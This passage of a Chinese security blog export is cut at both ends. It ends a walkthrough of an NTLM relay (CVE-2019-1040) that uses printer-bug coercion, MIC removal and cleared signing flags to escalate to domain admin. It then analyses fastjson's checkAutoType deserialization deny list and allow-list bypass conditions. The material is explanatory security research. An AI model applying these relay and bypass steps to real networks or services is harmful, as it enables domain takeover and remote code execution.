id=\"SDC将为admin用户申请的访问SDC的TGS发送给Service-A\"><a href=\"#SDC将为admin用户申请的访问SDC的TGS发送给Service-A\" class=\"headerlink\" title=\"SDC将为admin用户申请的访问SDC的TGS发送给Service A\"></a>SDC将为admin用户申请的访问SDC的TGS发送给Service A</h4><p>在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umslyn.png\" alt=\"umslyn.png\"></p>\n<h2 id=\"0x03技术点分析\"><a href=\"#0x03技术点分析\" class=\"headerlink\" title=\"0x03技术点分析\"></a><strong>0x03技术点分析</strong></h2><hr>\n<p>在理清利用流程后，接下来详解利用流程中的技术点</p>\n<h3 id=\"客户端与服务器端的SMB通信\"><a href=\"#客户端与服务器端的SMB通信\" class=\"headerlink\" title=\"客户端与服务器端的SMB通信\"></a>客户端与服务器端的SMB通信</h3><p>补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD53d.png\" alt=\"umD53d.png\"></p>\n<p>客户端与服务器端的SMB通信流程</p>\n<h3 id=\"SMB2-Negotiate-Protocol\"><a href=\"#SMB2-Negotiate-Protocol\" class=\"headerlink\" title=\"SMB2 / Negotiate Protocol\"></a><strong>SMB2 / Negotiate Protocol</strong></h3><p>Negotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。</p>\n<p>Negotiate Protocol命令分为如下两部分：</p>\n<ol>\n<li>Negotiate Protocol Request：客户端向服务器发送第一个SMB请求：“Negotiate ProtocolRequest”。这个请求包含了客户端所支持的各种 SMB Dialect。</li>\n<li>Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。</li>\n</ol>\n<p><strong>SMB2 / Session Setup</strong></p>\n<p>SMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。</p>\n<p>Session Setup分为如下两部分：</p>\n<p>1.Session SetupRequest: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。</p>\n<p>\\2. Session SetupResponse: 服务器回复是否通过验证。</p>\n<h3 id=\"SpoolService-printer-bug\"><a href=\"#SpoolService-printer-bug\" class=\"headerlink\" title=\"SpoolService/printer bug\"></a>SpoolService/printer bug</h3><p>在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。</p>\n<p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>\n<p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umsKzj.png\" alt=\"umsKzj.png\"></p>\n<p>在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDifH.png\" alt=\"umDifH.png\"></p>\n<p>下图是printerbug.py执行后的数据包：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDkpd.png\" alt=\"umDkpd.png\"></p>\n<p>1、第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test；</p>\n<p>2、接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umsbtS.png\" alt=\"umsbtS.png\"></p>\n<p>3、第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证）</p>\n<h3 id=\"SMB中继LDAP思路以及难点\"><a href=\"#SMB中继LDAP思路以及难点\" class=\"headerlink\" title=\"SMB中继LDAP思路以及难点\"></a>SMB中继LDAP思路以及难点</h3><p>在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下：</p>\n<p>1、默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDE6I.png\" alt=\"umDE6I.png\"></p>\n<p>2、将此SMB流量中继到LDAP时，由于此时的NegotiateSign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败</p>\n<p>3、为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set</p>\n<p>4、MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过</p>\n<p>5、需要寻找一种可以绕过MIC校验的方式，以便更改包中的值</p>\n<p>6、在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP</p>\n<h3 id=\"MIC校验\"><a href=\"#MIC校验\" class=\"headerlink\" title=\"MIC校验\"></a>MIC校验</h3><p>NTLM身份验证由3种消息类型组成：</p>\n<p>NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。</p>\n<p>NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDVXt.png\" alt=\"umDVXt.png\"></p>\n<p>Clinet与Server交互流程图</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDenP.png\" alt=\"umDenP.png\"></p>\n<p>Clinet与Server交互流量</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDm0f.png\" alt=\"umDm0f.png\"></p>\n<p>SMB认证协议流程</p>\n<p>为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDn78.png\" alt=\"umDn78.png\"></p>\n<p>存放于NTLM_AUTH中的MIC</p>\n<p>MIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。</p>\n<p>因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。</p>\n<h3 id=\"MIC校验绕过\"><a href=\"#MIC校验绕过\" class=\"headerlink\" title=\"MIC校验绕过\"></a>MIC校验绕过</h3><p>Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。</p>\n<p>如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤：</p>\n<p>取消MIC校验以确保可以修改数据包中的内容：</p>\n<p>（1）从NTLM_AUTHENTICATE消息中删除MIC</p>\n<p>（2）从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。</p>\n<h3 id=\"LDAP签名绕过\"><a href=\"#LDAP签名绕过\" class=\"headerlink\" title=\"LDAP签名绕过\"></a>LDAP签名绕过</h3><p>在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验</p>\n<p>将NEGOTIATE_SIGN设置为notset以绕过LDAP验证</p>\n<p>（1）    取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN</p>\n<p>（2）    取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。</p>\n<h3 id=\"smb中继LDAP流程\"><a href=\"#smb中继LDAP流程\" class=\"headerlink\" title=\"smb中继LDAP流程\"></a>smb中继LDAP流程</h3><p>为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDKAS.jpg\" alt=\"umDKAS.jpg\"></p>\n<p>Ntlmrelayx中继流程如下：</p>\n<p>1、取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDMtg.png\" alt=\"umDMtg.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDQhQ.png\" alt=\"umDQhQ.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_NEGOTIATE包内容</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD1pj.png\" alt=\"umD1pj.png\"></p>\n<p>Attacker将NTLMSSP_NEGOTIATE通过LDAP中继到DC包内容</p>\n<p>可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</p>\n<p>2、从NTLM_AUTHENTICATE消息中删除MIC以及版本字段</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD31s.png\" alt=\"umD31s.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD8cn.png\" alt=\"umD8cn.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_AUTH</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDYn0.png\" alt=\"umDYn0.png\"></p>\n<p>Attacker将NTLMSSP_AUTH通过LDAP中继到DC</p>\n<p>在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除</p>\n<p>3、取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/um4w4I.png\" alt=\"um4w4I.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDtBV.png\" alt=\"umDtBV.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_AUTH包内容</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDN7T.png\" alt=\"umDN7T.png\"></p>\n<p>Attacker将NTLMSSP_AUTH通过LDAP中继到DC包内容</p>\n<p>在通过LDAP中继时，NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’</p>\n<h2 id=\"0x04参考链接\"><a href=\"#0x04参考链接\" class=\"headerlink\" title=\"0x04参考链接\"></a><strong>0x04参考链接</strong></h2><hr>\n<p>[1] Exchange Server 2013 一步步安装图解</p>\n<p>[2] EnableLDAP over SSL (LDAPS) for Microsoft Active Directory servers</p>\n<p>[3] Windows Server 2012 R2 辅助域控制器搭建</p>\n<p>[4] 滥用基于资源约束委派来攻击Active Directory</p>\n<p>[5] AbusingS4U2Self: Another Sneaky Active Directory Persistence</p>\n<p>[6]利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞</p>\n<p>[7] 滥用Exchange：远离域管理员的一个API调用</p>\n<p>[8] The SYSTEM Account</p>\n<p>[9]Waggingthe Dog: Abusing Resource-Based Constrained Delegation to Attack ActiveDirectory</p>"},{"title":"FastJson checkAutoType安全机制研究","date":"2020-08-19T09:15:32.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d875a0425cab5a73c296a118f6d220e.jpg","_content":"\n在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。在之后的版本中，随着checkAutoType安全机制被不断绕过，fastjson也进行了一系列例如黑名单防逆向分析、扩展黑名单列表等加固。但是checkAutoType的原理未曾有过大的变化，因此本文将以fastjson 1.2.25版本为例，介绍一下checkAutoType安全机制的原理。\n\n在调试分析fastjson的checkAutoType安全机制之前，发现网上很多fastjson漏洞的分析文章中曾经提到过一个名为autoTypeSupport的开关，且在1.2.25以及之后的版本中默认关闭。在动手调试之前，我曾一度以为autoTypeSupport开关关闭与否直接决定了fastjson是完全摒弃或是使用autotype功能的。但是实际调试中发现，这个开关仅仅是checkAutoType安全机制中的一个选项，这个开关的关闭与否，并不直接作用于fastjson是否使用autoType机制，下文案例中可以看出这个问题。\n\nfastjson在1.2.25以及之后的版本中引入的checkAutoType安全机制，位于com/alibaba/fastjson/parser/ParserConfig.java文件。但并不是所有情况下fastjson都会加载这个机制进行安全监测，让我们下面来看看究竟什么情况下这个安全机制会被触发。\n\n通过调试fastjson 1.2.25代码发现，如果想触发checkAutoType安全机制，需要执行到com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中下图红框处位置\n\n![0e5919b9c8a6af8d6128a67c5eeed81b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151506-61d5fbe4-dba2-1.png)\n\n在分析触发checkAutoType安全机制的情况之前，首先来看下什么情况下不会触发checkAutoType安全机制\n\n不使用checkAutoType安全机制的情况\n---------------------------------\n\nfastjson将字符串转换为Java对象时，并不是都采用checkAutoType机制进行校验，以下两种情况均为使用checkAutoType机制\n\n- json字符串中未使用@type字段\n\n```java\n    public static void main(String[] args){\n        String jsonstr = \"{\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);\n    }\n```\n\n待处理字符串中并不包含@type字段。在将这个普通的json字符串转换为java对象方法过程中并不执行到上文JavaBeanDeserializer.java中userType = config.checkAutoType(typeName, expectClass);位置\n\n- Class\\<T\\> clazz与@type相同\n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);\n    }\n}\n```\n\n待处理的字符串@type指定的类与parseObject(String text, Class\\<T\\> clazz)中Class\\<T\\> clazz)参数指定的类相同，都是AutoTypeTest.Test1。在这种情况下，程序执行到下图红框处分支中\n\n![c260c13f64e851f6bd19932a6f08760f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151546-7a078f20-dba2-1.png)\n\n上图中typeName变量值由@type值传递而来；beanInfo.typeName变量值由parseObject(String text, Class\\<T\\> clazz)中Class\\<T\\> clazz所指定。在Class\\<T\\> clazz值与@type值相同的情况下，程序进入上图红框中的if分支。而在这个分支中，程序不是被break就是被continue，而checkAutoType安全机制加载位置又处在该处if分支后面（上图552行），因此程序无论如何也不会执行到上图552行的checkAutoType安全机制中。\n\n由上文两个例子可见，在1.2.25以及之后的版本中，并不是所有的情况都需要经过checkAutoType这一关卡的。\n\n我们接下来看看如何触发checkAutoType安全机制，以及checkAutoType安全机制的原理。\n\n使用checkAutoType安全机制的情况\n-------------------------------\n\n通过分析可以发现，checkAutoType安全机制中也是针对不同情况不同处理的：checkAutoType安全机制处理流程受autoTypeSupport、parseObject参数等因素控制，这些因素共同影响checkAutoType安全机制是如何过滤以及处理传入的等待反序列化的json字符串\n\n总得来说，有如下几个元素共同作用影响checkAutoType选择哪种方式处理输入\n\n- autoTypeSupport开关值（True/False）\n- 使用parseObject(String text, Class\\<T\\> clazz)或是parseObject(String text)（这里Class\\<T\\> clazz参数为应与@type字段不一样的值，否则不会触发checkAutoType）\n\n根据这两种条件，我们可以列出如下四种情况的表格\n\n|        | autoTypeSupport值 | parseObject(String text, Class\\<T\\> clazz)/ parseObject(String text) |\n| ------ | ----------------- | ------------------------------------------------------------ |\n| 情况一 | False             | parseObject(String text)                                     |\n| 情况二 | False             | parseObject(String text, Class\\<T\\> clazz)                   |\n| 情况三 | True              | parseObject(String text)                                     |\n| 情况四 | True              | parseObject(String text, Class\\<T\\> clazz)                   |\n\n接下来我们对上述四种情况逐一进行分析\n\n### autoTypeSupport值为False、使用parseObject(String text) \n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n接下来我们来看一下这种情况下checkAutoType安全机制是如何进行处理的\n\ncheckAutoType位于com/alibaba/fastjson/parser/ParserConfig.java中\n\n```java\n    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {\n        if (typeName == null) {\n            return null;\n        }\n\n        final String className = typeName.replace('$', '.');\n\n        if (autoTypeSupport || expectClass != null) {\n            ⋮\n        }\n\n        Class<?> clazz = TypeUtils.getClassFromMapping(typeName);\n        if (clazz == null) {\n            ⋮\n        }\n\n        if (clazz != null) {\n            ⋮\n        }\n\n        if (!autoTypeSupport) {\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n\n                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {\n                        throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n                    }\n                    return clazz;\n                }\n            }\n        }\n```\n\n由于autoTypeSupport为False，程序进入if (!autoTypeSupport)分支中\n\n```java\n        if (!autoTypeSupport) {\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n\n                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {\n                        throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n                    }\n                    return clazz;\n                }\n            }\n        }\n```\n\n程序首先遍历denyList这一黑名单，并判断className与黑名单是否匹配\n\n![934359dd24e91c0eae2b706a4721c00d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151624-904c2f3e-dba2-1.png)\n\n这里需要说明一下：className变量是由typeName简单变换而来，而typeName即为@type字段值。详见下图代码\n\n![c2e0aee6246db707820606da77be9959.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151634-96d0d38c-dba2-1.png)\n\n接下来看下黑名单中的元素\n\n![fdc610a0d2a6392ae7f762de681b70e8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151645-9d460688-dba2-1.png)\n\n```java\ndenyList =\n\"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework\"\n```\n\n如果className命中黑名单，程序抛出\"autoType is not support.\"异常并结束\n\n在黑名单过滤完成后，程序还会将className与白名单匹配一下，下图中红框里的for循环即为白名单匹配过程\n\n![0a39d8ffe2cf014fd9911637f87f606e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151704-a8b4b780-dba2-1.png)\n\n程序将className与acceptList白名单进行匹配，通过动态调试查看以下默认白名单中的值\n\n![728bed570e73423cc97341d28103790d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151715-aee0e7fa-dba2-1.png)\n\n从动态调试的结果可见，acceptList默认情况下是一个空列表。\n\n开发者可以通过ParserConfig.getGlobalInstance().addAccept()自行向acceptList白名单中增加元素。如下代码向白名单中增加了一个AutoTypeTest.Test1类\n\n```java\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().addAccept(\"AutoTypeTest.Test1\");\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n在白名单匹配环节，如果className指定的类与白名单中的项相匹成功，程序将该类的类对象赋值与clazz变量并返回\n\n![65eefbeb121ed88086f2a3b56d0f52af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151736-bbb9bede-dba2-1.png)\n\n程序接下来将传入的json字符串反序列为该类对象\n\n在程序执行完黑名单与白名单校验后，既没有匹配到黑名单，也没有匹配到白名单的话，程序最终会执行到下图分支\n\n![a5f4f7b4da2b416081ae013ea2ea93c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151754-c5f10970-dba2-1.png)\n\n此时程序将抛出异常并结束\n\n![92d6e52681cbab4b63d15ef0f1d39667.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151804-cc209b58-dba2-1.png)\n\n由于在1.2.25以及之后的版本中，autoTypeSupport值默认False。所以1.2.25以及之后的版本中假使攻击者构造的payload中的恶意类绕过了黑名单，但如果payload中的类不在白名单上，也是不能成功利用的。值得注意的是，白名单默认情况是空的。在此场景下payload想要执行成功，只有一种可能性：\n\n- @type字段值在不在黑名单中且在白名单中\n\n### autoTypeSupport值为False、使用parseObject(String text, Class\\<T\\> clazz) \n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test.class);\n        System.out.println(obj);\n    }\n}\n```\n\n注意上图，这里parseObject中的Class\\<T\\> clazz参数是AutoTypeTest.Test.class，而@type中的是AutoTypeTest.Test1，二者不是一个类。如果是一个类，根据上文checkAutoType触发条件分析，根本不会触发checkAutoType\n\n在这种情况下，我们再来看看checkAutoType会如何处理我们的数据\n\n```java\n    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {\n        if (typeName == null) {\n            return null;\n        }\n\n        final String className = typeName.replace('$', '.');\n\n        if (autoTypeSupport || expectClass != null) {\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    return TypeUtils.loadClass(typeName, defaultClassLoader);\n                }\n            }\n\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n        }\n```\n\n此时autoTypeSupport为true，expectClass不为空，程序会首先进入if (autoTypeSupport || expectClass != null)分支\n\n![ecafe6fede023596c9569bc166e154ae.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151827-d9eab0a2-dba2-1.png)\n\n值得注意的是，这个分支中是先匹配白名单，后匹配黑名单，如果@type字段指定的类在白名单中，则直接返回，不需要再经过黑名单过滤了。这一点很有意思，如果开发者因为开发失误，将存在利用的类加到了白名单里，攻击者是可以直接利用的\n\n回归正文，由于上图这里我们没有向白名单中增加AutoTypeTest.Test.class类，程序会接下来检查传入的类是否在黑名单中\n\n![93d672dc9d0fcd22ed5472e5ad1e7dd8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151838-e0ad1222-dba2-1.png)\n\n如果匹配到黑名单，则直接抛出错误\n\n如果这里既没有匹配到白名单直接返回，也没有匹配到黑名单抛出错误终止，程序则继续向下执行\n\n![e88c7abb2f44009cab7f6ed16955765e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151852-e8b00d9e-dba2-1.png)\n\n继续执行到的这个分支与情况一中的完全一致，又匹配了一遍黑名单与白名单。显而易见，这里既不会匹配到白名单，也不会匹配到黑名单\n\n最后程序执行到下图这里\n\n![0207749c04146ac393ecfe5159bb1d5b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151904-efb62f74-dba2-1.png)\n\n由于我们使用的是parseObject(String text, Class\\<T\\> clazz)这种方式，上图代码中872行处的expectClass即为Class\\<T\\> clazz传入的AutoTypeTest.Test.class类，而clazz变量为@type字段指定的AutoTypeTest.Test1.class类.程序通过\n\n```java\nexpectClass.isAssignableFrom(clazz)\n```\n\n判断Class\\<T\\> clazz传入的expectClass对象所表示的类是否与@type字段指定的clazz变量参数表示的类相同，或者是其超类或父接口。本例中AutoTypeTest.Test.class类与AutoTypeTest.Test1.class类所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常\n\n```java\nException in thread \"main\" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\> AutoTypeTest.Test\n```\n\n如果二者相同或者是超类、父类关系，程序将@type字段指定的类对象返回，并随后将传入字符串反序列化为该类对象\n\n- 此场景的安全隐患\n\n通过上文的分析，在此场景下程序会先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则程序是会跳过黑名单校验的，例如下图\n\n![e1fc601a50996f55f7a347bec030c7cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152135-4a20674a-dba3-1.png)\n\n即使com.sun.rowset.JdbcRowSetImpl在Fastjson默认黑名单中，但在开发的时候，由于开发安全意识不强或开发疏忽等原因，将com.sun.rowset.JdbcRowSetImpl加入了白名单，此时是可以绕过黑名单直接执行利用的。在此场景下，payload想执行成功，有两种可能性：\n\n- 没有命中黑名单且Class\\<T\\> clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。\n\n- @type字段值在白名单中\n\n### autoTypeSupport值为True、使用parseObject(String text)\n\n```java\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj)\n    }\n```\n\n在此场景中，程序首先进入了与上一场景相同的分支，与上一场景不同的是，这里是由于autoTypeSupport为true而进入此分支，而非上一场景满足expectClass != null这一条件\n\n![b6c844dff52bc46218e02c1dbd3767d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152202-59fb1002-dba3-1.png)\n\n与上一场景一致，程序先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则直接返回，不再进行黑名单校验。在白名单未匹配成功后，使用黑名单进行匹配，若匹配到黑名单，直接抛出异常。如果黑白名单都未匹配成功，程序继续向下执行\n\n![0458fe27ed39a0e5e2dc5c69964b09af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152212-6019ceb0-dba3-1.png)\n\n程序将@type字段指定的类返回\n\n这种情况下要是payload想成功利用有两种办法：\n\n- @type字段值只需要不在黑名单中即可成功利用\n\n- @type字段值在黑名单中，但是开发的时候在白名单中加入了这个类，payload依然可以成功利用\n\n### 四、autoTypeSupport值为True、使用parseObject(String text, Class\\<T\\> clazz)\n\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr,AutoTypeTest.Test.class);\n        System.out.println(obj)\n    }\n与上文第二、三场景相同，程序首先进入了这个分支\n\n![0bf84f2d75a81d8e7fcf8958a65a3c34.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152236-6e80c67a-dba3-1.png)\n\n此场景进入该分支的原因是autoTypeSupport与expectClass这两个条件都满足。关于这个分支的执行流程这里不再复述了\n\n在没有匹配到黑白名单后，程序执行到了下图这里\n\n![7832ca5693b89b2f1fb912c9df9cfe76.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152247-750ab5f0-dba3-1.png)\n\n由于这里clazz与expectClass所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常\n\n```java\nException in thread \"main\" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\> AutoTypeTest.Test\n```\n\n在这种情况下，payload想执行成功，有两种可能性：\n\n- 没有命中黑名单且Class\\<T\\>\n  clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。\n\n- @type字段值在白名单中\n\n早期checkAutoType安全机制缺陷\n-----------------------------\n\n在fastjson 1.2.25版本引入的checkAutoType以及后续的几个版本中存在着一定的缺陷\n\n如上文所分析，程序通常先经过黑名单与白名单的校验后，将满足条件的类对象通过如下代码赋值给clazz\n\n```java\nclazz = TypeUtils.loadClass(typeName, 